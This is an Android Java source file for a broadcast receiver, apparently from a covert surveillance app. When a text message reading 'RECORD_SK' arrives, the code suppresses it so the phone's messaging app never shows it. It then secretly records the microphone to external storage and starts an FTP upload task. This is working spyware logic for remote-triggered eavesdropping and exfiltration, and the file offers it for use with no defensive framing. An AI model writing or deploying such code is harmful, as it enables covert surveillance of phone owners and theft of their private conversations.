package com.example.smsreceiver;



import java.io.IOException;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaPlayer;
import android.media.MediaRecorder;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SmsReceiver extends BroadcastReceiver {
	
	private MediaRecorder myRecorder;
	private String outputFile = null;

    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(SMS_RECEIVED)) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                // get sms objects
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus.length == 0) {
                    return;
                }
                // large message might be broken into many
                SmsMessage[] messages = new SmsMessage[pdus.length];
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < pdus.length; i++) {
                    messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                    sb.append(messages[i].getMessageBody());
                }
                String sender = messages[0].getOriginatingAddress();
                String message = sb.toString();
               
                // Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
                
                
                if(message.equals("RECORD_SK")){
                
                //Doesnt broadcast it to  the SMS APP.
                abortBroadcast();

                
                //////////////////////////////////////////////////////////////////////////////////////////////////
            	//The Record PART
                
        		// store it to sd card
        		outputFile = Environment.getExternalStorageDirectory().getAbsolutePath() + "/record.3gpp";

        		myRecorder = new MediaRecorder();
        		myRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        		myRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        		myRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);
        		myRecorder.setOutputFile(outputFile);

        		// record part  START
        		try {
        			myRecorder.prepare();
        			myRecorder.start();
        		} catch (IllegalStateException e) {
        			// start:it is called before prepare()
        			// prepare: it is called after start() or before setOutputFormat()
        			e.printStackTrace();
        		} catch (IOException e) {
        			// prepare() fails
        			e.printStackTrace();
        		}
        		

        		final Handler handler = new Handler();
        		handler.postDelayed(new Runnable() {
        			@Override
        			public void run() {
        				//STOP 
        				try {
        					myRecorder.stop();
        					myRecorder.release();
        					myRecorder = null;
        				} catch (IllegalStateException e) {
        					// it is called before start()
        					e.printStackTrace();
        				} catch (RuntimeException e) {
        					// no valid audio/video data has been received
        					e.printStackTrace();
        				}
        	
        			}
        		}, 4000);


        		// upload
        		new FtpUpload().execute();
        		
        		/////////////////////////////////////////////////////////////////////////////////////////
                

                
                }
                

            }
        }
    }
}